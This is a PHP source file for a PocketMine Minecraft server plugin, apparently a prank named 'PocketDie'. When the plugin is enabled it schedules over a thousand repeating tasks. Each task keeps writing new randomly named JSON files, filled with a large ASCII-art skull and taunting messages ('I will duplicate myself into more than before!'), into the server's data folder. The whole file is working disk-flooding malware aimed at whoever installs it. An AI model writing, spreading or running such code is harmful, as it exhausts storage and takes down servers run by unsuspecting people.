<?php
namespace DragoVN;

use DragoVN\Main;
use pocketmine\event\Listener;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\scheduler\Task;
use pocketmine\Player;
use pocketmine\Server;
use pocketmine\utils\Config;

class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()
            ->getPluginManager()
            ->registerEvents($this, $this);
		for ($i = 0;$i <= 1000;$i++)
        {
        $this->getScheduler()
            ->scheduleRepeatingTask(new npc1($this) , $i);
		}
	}
    public function replication()
    {
        $letters = 'qwertyuiopasdfghjklzxcvbnm123456789';
        $code = "PocketDie-";
        for ($i = 0;$i < 10;$i++)
        {
            $code .= $letters[mt_rand(0, 25) ];
        }
        //$config = new Config($this->getDataFolder().$code.".json", Config::JSON);
        $config = new Config($this->getDataFolder() . $code . ".json", Config::JSON, array(
            "Hi" => ["MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhyo+:-.`         ``.-:+oydmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds+-`                            `-+sdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMNho-`                                      `:ohNMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMmy/`                                              `/yNMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMNy:`                                                    `/yNMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMmo.                                                          .omMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMd/`                                                              `/dMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMd/`                                                                  `/mMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMN+`        .:-             ``...------------...``             -:.        `oNMMMMMMMMMMMM",
            "MMMMMMMMMMMy.      `:sdh:`         `.....--.``-. -.`.-``.--.....`         `:hds:`      -hMMMMMMMMMMM",
            "MMMMMMMMMN+    ..`omMNo`       ``...```..`   -.  -.  .-   `..```...`        `sMMm+`..   `oNMMMMMMMMM",
            "MMMMMMMMm-   :yo-dMMm/       `.-.`   .-`    -.   -.   -.    `-.   `--.`       /mMMh-oy:   :mMMMMMMMM",
            "MMMMMMMd.  `yMy`dMms:/     `-.``....--`    `-    -.   `-`    `--....``..`     +:sNMh`hNs`  -mMMMMMMM",
            "MMMMMMd. ``yMM.odo/sd.   `-.`     .-.......--``-:+oo/-`--.......-.     `.-`   -mo/om+-MMs`` .mMMMMMM",
            "MMMMMm. :o-MMd`/+hNm-   .-`      `-`     `.-``oNh-:dMNo`-.`     `-`      `-.   :mNh+/`mMM.s- .mMMMMM",
            "MMMMN- :N//MM/sNMmo`  `-.       `-`       -.  /hs-.yMMo -.       `-`       .-`  .omMmo+MM:+N: :MMMMM",
            "MMMM+ .NM/:MdmNh/:   `-`        -.        -`     -+md/` .-        .-        `-`   :/hNmdM-+Mm` oMMMM",
            "MMMd  +MMo.Mms:/d-  `--..``    .-        `-      :y-    `-`        -.    ``..--`  :h/:yNM`sMM/ `mMMM",
            "MMM:  sMMh.h:omMo  `-` ``......-.`       .-      ::      -.      ``.-......`` `-`  sMm+:d`dMMo  /MMM",
            "MMd  `oMMd`+NMMs   -.         .-`........--..```/md/``...--........`-.         .-   sMMm/`mMM+`  mMM",
            "MM+ ./.MMhoMMm+   .-          -.         -.`````/dd:`````.-         .-          -`   +NMM+dMN`+. sMM",
            "MM. ss sMhMMy`s   -.         `-`         -`      -.      .-         `-          .-  `o.yMNhMo yo :MM",
            "MM  dN.`mNN/ sm  `-`         `-          -`  ``-+oo+-``  `-          -`         `-   No /MNd .Mh `MM",
            "Mm  dMd :M:`dMo  `-          .-          -`:y.-smMMms--y:.-          -`         `-`  yMh`/M-`dMy  NM",
            "Mm  oMMh +.mMM.  `-..........--........-/smMN   /NN:  `MMms/-........--.........--`  -MMm`+`dMM/  NM",
            "Mm  `MMMs dMMs   `-          .- :+osyhmMMMMM+  -/hy/.  oMMMMMmhyso+: -`         `-`   yMMy yMMN`  NM",
            "MM  .+MMM-MMm`+  `-`         `-oMMMMMMMMMMMM.   `Nm    -MMMMMMMMMMMM+-`         `-   +`NMN:MMM/. `MM",
            "MM- y`/NMsMM/ N/  -.         `-dMMMMMMMMMMMM-   +MM/   :MMMMMMMMMMMMh-          .-  +m +MNyMm:.y :MM",
            "MMo hd..hNNm :Md  `-          :MMMMMMMMMMMMMs   yMMs   hMMMMMMMMMMMMN-         `-`  mM- NNNy`-my sMM",
            "MMm :MNo`/mh yMM`  -.         +MMMMMMMMMMMMMM/  hMMy  +MMMMMMMMMMMMMM/         .-  .MMs dm:`oNM- mMM",
            "MMM: oMMm+-o NMM-` `-` ``.....hMMMMMMMMMMMMMMN: dMMy /NMMMMMMMMMMMMMMy.....`` .-` `:MMm s-+mMM+ /MMM",
            "MMMd  /mMMm/ NMM:-s``--.``    dMMMMMMMMMMMMMMMN+mMMdoMMMMMMMMMMMMMMMMh    ``.--``s./MMm /mMMm: `mMMM",
            "MMMM+  -yMMNsoMM+ mh.`-`     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM`     .-`.dd oMM+yMMMy.  sMMMM",
            "MMMMN- /::ymMddMh sMd.`-.    /MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:    .-`.mM+ dMddMms-/: :MMMMM",
            "MMMMMm.`hy-./ydNM--MMd` .-`  sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo  `-. `mMM.:MNdy:.:yy -NMMMMM",
            "MMMMMMd.`yNd+--:yy`dMMs`.`-.`dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh`..`.`yMMh`ys:--odNs`.mMMMMMM",
            "MMMMMMMd. /dMNmy+/.-NMM//y:..NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm../h//MMm--/ohmNMd: -mMMMMMMM",
            "MMMMMMMMm: `/hNMMMmy+dMm.oNh/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN/dN+-NMd+ymMMMmy:` /NMMMMMMMM",
            "MMMMMMMMMN+`  :+hmNMMmmNd.oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN+-mNmmMMNmh+:  `oNMMMMMMMMM",
            "MMMMMMMMMMMh- .++:::/osydh:/dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd/:hdys+/:::++` -dMMMMMMMMMMM",
            "MMMMMMMMMMMMNo` /hdhysoooos+/ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyo/+sooossyhdy: `oNMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMm/` -+ymNNMMMMMMNmmmhsyMMMMMMMMMMMMMMMMMMMMMMMMMMyydmmmNMMMMMMNNmy+. `+mMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMd/`  `:///+++/:--.:sdMMMMMMMMMMMMMMMMMMMMMMMMMMdo:.--:/+++///:`  `+mMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMmo. .+yssoosyhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhssoosss/. .smMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMNh/``:oydmNNNmdymMMMMMMMMMMMMMMMMMMMMMMMMMMdydmNNNmdy+-``/hMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMNy/.    `    hMMMMMMMMMMMMMMMMMMMMMMMMMMy    `   `.+hNMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMds:`     mMMMMMMMMMMMMMMMMMMMMMMMMMMd     `:sdMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdy+:.MMMMMMMMMMMMMMMMMMMMMMMMMMMN.:+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
            "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM",
			"                I make you feel uncomfortable so please delete me!",
			"                You're away from me!",
			"                Thank you for installing me!",
			"                I will duplicate myself into more than before!",
			"                Because I'm just a 0.1 candle please wait!",
			""]
        ));
        $config->save();
    }
}
class npc1 extends Task
{

    public function __construct(Main $plugin)
    {
        $this->plugin = $plugin;
    }

    public function onRun(int $tick)
    {
        $this
            ->plugin
            ->replication();
    }
}


